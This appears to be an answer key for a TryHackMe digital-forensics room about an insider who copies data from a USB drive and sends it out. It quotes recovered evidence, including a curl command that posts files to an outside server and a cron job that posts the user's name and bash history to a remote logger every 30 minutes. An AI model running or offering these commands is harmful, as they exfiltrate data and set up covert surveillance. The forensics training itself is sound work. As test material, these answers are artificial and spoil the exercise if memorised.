@@ -1,0 +1,44 @@
+ExfilNode
+https://tryhackme.com/room/exfilnode
+
+When did Liam last logged into the system? (Format: YYYY-MM-DD HH:MM:SS)
+2025-02-28 10:59:07
+
+What was the timezone of Liam’s device?
+America/Toronto
+
+What is the serial number of the USB that was inserted by Liam?
+2651931097993496666
+
+When was the USB connected to the system? (Format: YYYY-MM-DD HH:MM:SS)
+2025-02-28 10:59:25
+
+What command was executed when Liam ran 'transferfiles'?
+cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data
+
+What command did Liam execute to transfer the exfiltrated files to an external server?
+curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
+
+What is the IP address of the domain to which Liam transferred the files to?
+5.45.102.93
+
+Which directory was the user in when they created the file 'mth'?
+/home/liam
+
+Remember Henry, the external entity helping Liam during the exfiltration? What was the amount in USD that Henry had to give Liam for this exfiltration task?
+10000
+
+When was the USB disconnected by Liam? (Format: YYYY-MM-DD HH:MM:SS)
+2025-02-28 11:44:00
+
+There is a .hidden/ folder that Liam listed the contents of in his commands. What is the full path of this directory?
+/home/liam/Public
+
+Which files are likely timstomped in this .hidden/ directory (answer in alphabetical order, ascending, separated by a comma. e.g example1.txt,example2.txt)
+file3.txt,file7.txt
+
+Liam thought the work was done, but the external entity had other plans. Which IP address was connected via SSH to Liam's machine a few hours after the exfiltration? 
+94.102.51.15
+
+Which cronjob did the external entity set up inside Liam’s machine?
+*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php
